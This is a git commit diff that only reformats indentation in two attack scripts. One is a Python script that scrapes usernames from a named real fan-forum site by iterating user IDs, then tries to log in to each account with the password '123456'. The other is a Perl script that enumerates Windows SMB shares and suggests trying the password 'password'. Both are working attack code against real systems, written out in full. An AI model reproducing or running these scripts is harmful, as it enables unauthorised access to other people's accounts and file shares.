bbe48dc2d24cc6369ed0b20acc5bf02484d2b774
dual <github@getdual.neomailbox.net>
2013-08-21 04:18:17 -0700

    fixed tab size in charlie daniels and netbiowned

--- charlie_pwniels_band.py
+++ charlie_pwniels_band.py
@@ -13,35 +13,35 @@ import httplib, random, re, time, urllib
 
 # POST function
 def post(USERNAME):
-    # Debug user name
-    #print USERNAME
-    params = urllib.urlencode({'referrer': "http%3A%2F%2Fwww.charliedanielssoapbox.com&login=&user_name=str(USERNAME)&user_password=123456&login=Login",
-                           'user_name': USERNAME,
-                           'user_password': "123456",
-                           'login': "Login"})
+	# Debug user name
+	#print USERNAME
+	params = urllib.urlencode({'referrer': "http%3A%2F%2Fwww.charliedanielssoapbox.com&login=&user_name=str(USERNAME)&user_password=123456&login=Login",
+							'user_name': USERNAME,
+							'user_password': "123456",
+							'login': "Login"})
 
-    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
-    conn = httplib.HTTPConnection("www.charliedanielssoapbox.com:80")
-    conn.request("POST", "/login.php", params, headers)
-    response = conn.getresponse()
+	headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
+	conn = httplib.HTTPConnection("www.charliedanielssoapbox.com:80")
+	conn.request("POST", "/login.php", params, headers)
+	response = conn.getresponse()
 
-    # Debug response
-    #print response.status, response.reason
+	# Debug response
+	#print response.status, response.reason
 
-    if   response.status == 200:
-          print "FAIL\n"
-          results.write("FAIL\n")
-    elif response.status == 302:
-          print "123456 FTW!\n"
-          results.write("123456 FTW!\n")
-    else:
-          print "Unknown response: ", response.status
-          results.write("Unknown response\n")
+	if response.status == 200:
+		print "FAIL\n"
+		results.write("FAIL\n")
+	elif response.status == 302:
+		print "123456 FTW!\n"
+		results.write("123456 FTW!\n")
+	else:
+		print "Unknown response: ", response.status
+		results.write("Unknown response\n")
 
-    # Debug data
-    #data = response.read()
+	# Debug data
+	#data = response.read()
 
-    conn.close()
+	conn.close()
 
 # Generate and shuffle user IDs
 user_ids = list(range(1000, 6001))
@@ -54,25 +54,25 @@ random.shuffle(user_ids)
 
 # Open results file
 try:
-    results = open("results.txt", "w")
+	results = open("results.txt", "w")
 except(IOError), error:
-    print "Could not open results.txt:\n", error
-    print "Exiting..."
-    sys.exit()
+	print "Could not open results.txt:\n", error
+	print "Exiting..."
+	sys.exit()
 
 # Iterate through user IDs and GET user name
 for user in user_ids:
-    page = urllib.urlopen("http://www.charliedanielssoapbox.com/view_user.php?id=" + str(user))
-    content = page.read()
-    page.close()
-    match = re.search('pm.php\?send_to=(.*)"', content)
-    if match:
-        if (re.search('[a-zA-Z]', match.group(1))):
-            print match.group(1)
-            results.write(match.group(1))
-            results.write(": ")
-            post(match.group(1))
-    time.sleep(1)
+	page = urllib.urlopen("http://www.charliedanielssoapbox.com/view_user.php?id=" + str(user))
+	content = page.read()
+	page.close()
+	match = re.search('pm.php\?send_to=(.*)"', content)
+	if match:
+		if (re.search('[a-zA-Z]', match.group(1))):
+			print match.group(1)
+			results.write(match.group(1))
+			results.write(": ")
+			post(match.group(1))
+	time.sleep(1)
 
 results.close()
 
--- netbiowned.pl
+++ netbiowned.pl
@@ -18,9 +18,9 @@ usage() unless ($1 < 255 && $2 < 255 && $3 < 255 && $4 < 255);
 
 # Provide assistance
 sub usage {
-  print "netbiowned.pl - Simplifies windows share enumeration\n";
-  print "Usage: perl netbiowned.pl <ip address>\n";
-  exit;
+	print "netbiowned.pl - Simplifies windows share enumeration\n";
+	print "Usage: perl netbiowned.pl <ip address>\n";
+	exit;
 }
 
 # Perform initial lookup
@@ -30,27 +30,26 @@ print ">>> netbiowned.pl -
 my @lookup = `nmblookup -A $ip_addr`;
 
 foreach my $line (@lookup) {
-  if ($line =~ /No reply/i) {
-    print "\n>>> Windows shares not vulnerable... exiting\n";
-    exit;
-  }
-  else {
-    if ($line =~ /\s*([\w\-]*)\s*<00>/ && $line !~ /GROUP/) {
-      $comp_name = $1;
-    }
-  }
+	if ($line =~ /No reply/i) {
+		print "\nWindows shares not vulnerable... exiting.\n";
+		exit;
+	}
+	else {
+		if ($line =~ /\s*([\w\-]*)\s*<00>/ && $line !~ /GROUP/) {
+			$comp_name = $1;
+		}
+	}
 }
 
-print " done!\n";
+print " Done.\n";
 
 # Now list shares
-print ">>> Attempting to list shares on $comp_name...
->>> Try a password of \'password\'
->>> Then...
+print "Attempting to list shares on $comp_name...
+Try a password of \'password\' and
 
     smbclient //$comp_name/DIR -I $ip_addr
 
->>> if that's successful.
+if that's successful.
 ";
 
 system("smbclient -L $comp_name -I $ip_addr");
